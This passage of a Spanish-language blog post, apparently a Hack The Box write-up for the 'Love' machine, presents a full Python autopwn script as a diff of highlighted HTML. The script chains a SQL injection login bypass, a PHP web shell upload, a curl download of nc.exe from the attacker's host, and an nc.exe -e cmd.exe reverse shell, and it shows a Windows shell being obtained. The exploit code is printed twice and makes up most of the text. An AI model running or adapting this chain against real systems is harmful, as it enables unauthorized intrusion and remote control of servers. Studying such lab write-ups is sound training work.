+    <span class="n">ip</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">LoveIP</span><span class="si">}</span><span class="s">/admin/login.php'</span>
+    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">'login'</span><span class="p">:</span><span class="s">'yea'</span><span class="p">,</span>
+        <span class="s">'password'</span><span class="p">:</span><span class="s">'admin'</span><span class="p">,</span>
+        <span class="s">'username'</span><span class="p">:</span> <span class="s">"""dsfgdf' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -"""</span>
+    <span class="p">}</span>
+    <span class="n">cookies</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">data</span> <span class="o">=</span> <span class="n">post_data</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Injección SQL exitosa</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[!] Injección SQL fallida</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Con la sesión iniciada, procedemos a subir un archivo php malicioso:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">uploadshell</span><span class="p">():</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"""  &lt;?php echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;"; ?&gt; """</span> 
+
+    <span class="n">files</span>  <span class="o">=</span> <span class="p">{</span><span class="s">'photo'</span><span class="p">:(</span><span class="s">'shell.php'</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+        <span class="p">}</span>
+
+    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s">'firstname'</span> <span class="p">:</span><span class="s">' lorem'</span><span class="p">,</span>
+            <span class="s">'lastname'</span><span class="p">:</span><span class="s">'lorem'</span><span class="p">,</span>
+            <span class="s">'password'</span><span class="p">:</span><span class="s">'lorem'</span><span class="p">,</span>
+            <span class="s">'add'</span><span class="p">:</span><span class="s">''</span>
+        <span class="p">}</span>
+
+    <span class="n">LoveVote</span><span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">LoveIP</span><span class="si">}</span><span class="s">/admin/voters_add.php'</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">LoveVote</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span> <span class="n">post_data</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"[+] Subida de shell existosa</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"[!] Subida de shell fallida</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Con el archivo ya subido a la máquina, intentaremos subir el <code class="language-plaintext highlighter-rouge">nc.exe</code> a la máquina víctima:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">uploadNC</span><span class="p">():</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">LoveIP</span><span class="si">}</span><span class="s">/images/shell.php?cmd=curl </span><span class="si">{</span><span class="n">ipHost</span><span class="si">}</span><span class="s">/nc.exe -O nc.exe'</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Finalmente, nos conectamos con el <code class="language-plaintext highlighter-rouge">nc.exe</code> desde la máquina víctima:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">conection</span><span class="p">():</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\t\n\n</span><span class="s">[+] Completando proceso, revise netcat</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">LoveIP</span><span class="si">}</span><span class="s">/images/shell.php?cmd=nc.exe -e cmd.exe </span><span class="si">{</span><span class="n">ipHost</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">ipPort</span><span class="si">}</span><span class="s">'</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Dentro del main tenemos:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\n</span><span class="s">[+] Recuerda estar esperando conexión en netcat en el puerto </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="si">}</span><span class="se">\n\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">getNetcat</span><span class="p">()</span>
+    <span class="n">sqli</span><span class="p">()</span>
+    <span class="n">uploadshell</span><span class="p">()</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">so</span><span class="p">:</span>
+            <span class="n">so</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
+            <span class="n">http_server</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"python3"</span><span class="p">,</span> <span class="s">"-m"</span><span class="p">,</span> <span class="s">"http.server"</span><span class="p">,</span> <span class="s">"80"</span><span class="p">])</span>
+    <span class="k">except</span> <span class="nb">OSError</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor"</span><span class="p">)</span>
+   
+    <span class="n">uploadNC</span><span class="p">()</span>
+    <span class="n">http_server</span><span class="p">.</span><span class="n">terminate</span><span class="p">()</span>
+    <span class="n">conection</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Obsevamos la llamada de las funciones y el subproceso que permite tener un servidor http con python para compartir el <code class="language-plaintext highlighter-rouge">nc.exe</code> y que la máquina víctima pueda descargarlo.</p>
+
+<p>Luego, solo basta con iniciar al script junto con tu ip y el puerto que quieras recibir la reverse, y dejas tu <code class="language-plaintext highlighter-rouge">netcat</code> esperando conexión.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Completando proceso, revise netcat
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.10.239] 60385
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\omrs\images&gt;
+</code></pre></div></div>
+
+<p>El código completo es el siguiente:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">sys</span><span class="p">,</span><span class="n">subprocess</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
+
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[!] saliendo...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[!] Uso: python3 </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> "Tu IP"  "Puerto para tu netcat"</span><span class="se">\n</span><span class="s">'</span> <span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+
+<span class="n">ipHost</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">ipPort</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">LoveIP</span> <span class="o">=</span> <span class="s">'http://10.10.10.239'</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">getNetcat</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">"locate"</span><span class="p">,</span> <span class="s">"nc.exe"</span><span class="p">])</span>
+        <span class="n">result2</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="n">result2</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">'cp </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s"> .'</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"nc.exe not found"</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">sqli</span><span class="p">():</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">LoveIP</span><span class="si">}</span><span class="s">/admin/login.php'</span>
+    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">'login'</span><span class="p">:</span><span class="s">'yea'</span><span class="p">,</span>
+        <span class="s">'password'</span><span class="p">:</span><span class="s">'admin'</span><span class="p">,</span>
+        <span class="s">'username'</span><span class="p">:</span> <span class="s">"""dsfgdf' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -"""</span>
+    <span class="p">}</span>
+    <span class="n">cookies</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">data</span> <span class="o">=</span> <span class="n">post_data</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Injección SQL exitosa</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[!] Injección SQL fallida</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">uploadshell</span><span class="p">():</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"""  &lt;?php echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;"; ?&gt; """</span> 
+
+    <span class="n">files</span>  <span class="o">=</span> <span class="p">{</span><span class="s">'photo'</span><span class="p">:(</span><span class="s">'shell.php'</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+        <span class="p">}</span>
+
+    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s">'firstname'</span> <span class="p">:</span><span class="s">' lorem'</span><span class="p">,</span>
+            <span class="s">'lastname'</span><span class="p">:</span><span class="s">'lorem'</span><span class="p">,</span>
+            <span class="s">'password'</span><span class="p">:</span><span class="s">'lorem'</span><span class="p">,</span>
+            <span class="s">'add'</span><span class="p">:</span><span class="s">''</span>
+        <span class="p">}</span>
+
+    <span class="n">LoveVote</span><span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">LoveIP</span><span class="si">}</span><span class="s">/admin/voters_add.php'</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">LoveVote</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span> <span class="n">post_data</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"[+] Subida de shell existosa</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"[!] Subida de shell fallida</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">uploadNC</span><span class="p">():</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">LoveIP</span><span class="si">}</span><span class="s">/images/shell.php?cmd=curl </span><span class="si">{</span><span class="n">ipHost</span><span class="si">}</span><span class="s">/nc.exe -O nc.exe'</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">conection</span><span class="p">():</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\t\n\n</span><span class="s">[+] Completando proceso, revise netcat</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">LoveIP</span><span class="si">}</span><span class="s">/images/shell.php?cmd=nc.exe -e cmd.exe </span><span class="si">{</span><span class="n">ipHost</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">ipPort</span><span class="si">}</span><span class="s">'</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\n</span><span class="s">[+] Recuerda estar esperando conexión en netcat en el puerto </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="si">}</span><span class="se">\n\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">getNetcat</span><span class="p">()</span>
+    <span class="n">sqli</span><span class="p">()</span>
+    <span class="n">uploadshell</span><span class="p">()</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">so</span><span class="p">:</span>
+            <span class="n">so</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
+            <span class="n">http_server</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"python3"</span><span class="p">,</span> <span class="s">"-m"</span><span class="p">,</span> <span class="s">"http.server"</span><span class="p">,</span> <span class="s">"80"</span><span class="p">])</span>
+    <span class="k">except</span> <span class="nb">OSError</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor"</span><span class="p">)</span>
+   
+    <span class="n">uploadNC</span><span class="p">()</span>
+    <span class="n">http_server</span><span class="p">.</span><span class="n">terminate</span><span class="p">()</span>
+    <span class="n">conection</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>¡Listo!, terminamos la automatización de la intrusión.</p>
+
+<p>Nos vemos, hasta la próxima.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#alwaysinstallelevated" class="page__taxonomy-item" rel="tag">AlwaysInstallElevated</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#autopwn" class="page__taxonomy-item" rel="tag">Autopwn</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#cms" class="page__taxonomy-item" rel="tag">CMS</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">Enumeration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ssrf" class="page__taxonomy-item" rel="tag">SSRF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windowns" class="page__taxonomy-item" rel="tag">Windowns</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#winpeas" class="page__taxonomy-item" rel="tag">WinPEAS</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack The Box</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#write-up" class="page__taxonomy-item" rel="tag">Write up</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-10T00:00:00-05:00">February 10, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/Jeeves/" class="pagination--pager" title="Jeeves HTB Write-up
+">Previous</a>
+    
+    
+      <a href="/NodeBlog/" class="pagination--pager" title="NodeBlog HTB Write-up
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 grafis</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
